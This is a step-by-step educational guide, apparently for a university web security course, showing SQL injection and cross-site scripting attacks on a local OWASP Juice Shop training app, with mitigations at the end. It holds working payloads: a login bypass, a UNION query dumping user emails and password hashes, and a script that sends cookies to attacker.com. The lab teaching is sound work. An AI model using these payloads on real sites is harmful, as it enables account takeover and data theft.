# SQL Injection (SQLi) and Cross-Site Scripting (XSS) Attack Guide

## Introduction
This document provides a dummy, educational guide on step-by-step instructions for demonstrating SQL Injection (SQLi) and Cross-Site Scripting (XSS) attacks using the OWASP Juice Shop application. This is intended for learning purposes only in a controlled, local environment. Do not use these techniques on real websites without permission, as that would be illegal and unethical.

OWASP Juice Shop is a deliberately insecure web app designed for security training. Assumptions:
- You have Juice Shop running locally (e.g., via Docker: `docker run --rm -p 3000:3000 bkimminich/juice-shop`).
- Access it at http://localhost:3000.
- All steps are for demonstration; in a real project, document with screenshots.

References:
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- Juice Shop Challenges: https://pwning.owasp-juice.shop/part2/challenges.html

## Section 1: SQL Injection (SQLi)
SQLi exploits poor input handling by injecting malicious SQL code into queries, potentially allowing data access, modification, or deletion.

### High-Level Overview
1. Identify input fields that interact with the database (e.g., login, search).
2. Test with probes to detect vulnerabilities (e.g., error messages).
3. Exploit by crafting payloads to bypass auth or extract data.
4. Mitigate with prepared statements, input validation.

### Step-by-Step Dummy Instructions for Demonstration
#### Step 1: Setup and Identification
- Launch Juice Shop and navigate to the login page.
- Enter a single quote (') in the email field and submit. Look for error messages like "SQLITE_ERROR" indicating vulnerability.

#### Step 2: Basic Authentication Bypass (Union-Based SQLi)
- Go to the login page.
- In the email field, enter: `' OR 1=1 --`
- Enter any password (e.g., "test").
- Submit. This makes the query always true, logging you in as the admin user.
- Expected: Successful login without credentials.

#### Step 3: Data Extraction (Union-Based)
- Use the search bar (after logging in or as guest).
- Enter: `') UNION SELECT id, email, password_md5 FROM Users --`
- Submit. This appends a query to dump user data.
- Expected: Search results show leaked emails and hashed passwords.

#### Step 4: Blind SQLi (Time-Based or Boolean)
- In search: `%' AND (CASE WHEN (SELECT COUNT(*) FROM Users) > 0 THEN 1 ELSE (SELECT 1/0) END) --`
- Observe response differences (e.g., error vs. no error) to infer data.
- Expected: Confirms table existence without direct output.

#### Step 5: Documentation Notes
- Take screenshots of input, error messages, and results.
- Note impact: Unauthorized access, data breach.

## Section 2: Cross-Site Scripting (XSS)
XSS injects malicious scripts into web pages, executed in users' browsers, potentially stealing sessions or defacing sites.

### High-Level Overview
1. Find fields that reflect or store user input (e.g., search, comments).
2. Test with script tags to check for execution.
3. Exploit by injecting payloads that run JavaScript.
4. Mitigate with output encoding, sanitization (e.g., DOMPurify).

### Step-by-Step Dummy Instructions for Demonstration
#### Step 1: Setup and Identification
- Navigate to the search bar or customer feedback page in Juice Shop.
- Enter: `<script>alert('test')</script>`
- Submit and observe if an alert pops up, indicating no sanitization.

#### Step 2: Reflected XSS (Immediate Execution)
- In the search bar: `<script>alert('XSS Reflected')</script>`
- Submit. The script reflects back and executes.
- Expected: Alert box appears on the results page.

#### Step 3: Stored XSS (Persistent)
- Go to the "Customer Feedback" page.
- In the comment field: `<script>alert('XSS Stored')</script>`
- Submit the form.
- View the feedback as another user or refresh.
- Expected: Alert executes every time the page loads.

#### Step 4: DOM-Based XSS
- In the search bar: `<iframe src="javascript:alert('DOM XSS')"></iframe>`
- Submit. This manipulates the DOM directly.
- Expected: Alert triggers without server reflection.

#### Step 5: Advanced Payload (e.g., Session Theft)
- Inject: `<script>document.location='http://attacker.com?cookie='+document.cookie</script>`
- Expected: Simulates stealing cookies (in demo, use console to verify).

#### Step 6: Documentation Notes
- Capture browser console logs and alerts.
- Note impact: Cookie theft, phishing.

## Mitigation Strategies (For Both Attacks)
### For SQLi:
- Use parameterized queries (e.g., in Node.js: `db.query('SELECT * FROM users WHERE id = ?', [userId])`).
- Validate input: Check for expected formats (e.g., email regex).
- Sanitize: Escape special characters.

### For XSS:
- Sanitize inputs: Use libraries like DOMPurify.
- Encode outputs: HTML-encode user data before rendering.
- Add CSP headers: `Content-Security-Policy: script-src 'self'`.

## Conclusion
This guide is for educational demo only. In your project, implement fixes in a forked Juice Shop repo and re-test to show improvements. Always follow ethical hacking guidelines.

- Created: September 29, 2025
- For: Web Application Security Project (WAS621S)
